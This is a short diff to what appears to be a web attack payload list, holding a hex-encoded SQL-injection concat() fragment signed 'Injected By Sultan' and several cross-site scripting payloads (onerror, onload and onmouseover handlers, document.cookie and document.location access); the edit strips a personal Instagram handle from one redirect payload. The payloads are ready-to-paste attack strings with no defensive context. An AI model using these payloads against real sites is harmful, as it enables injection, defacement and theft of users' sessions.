@@ -21,7 +21,7 @@ concat(0x496e6a65637465642042792053756c74616e20,'<br>','<br>',0x55736572203a20,u
 ~XSS~
 <img src=xss onerror=alert(1)>
 “><img src=x onerror=prompt(document.domain)>
-"><script>alert(document.location="https://Instagram.com/smith.id_")</script>
+"><script>alert(document.location="https://Instagram.com/")</script>
 "><script>alert(document.cookie)</script>
 "onmouseover="alert('xxs')"
 <svg onload=alert%26%230000000040"1")>
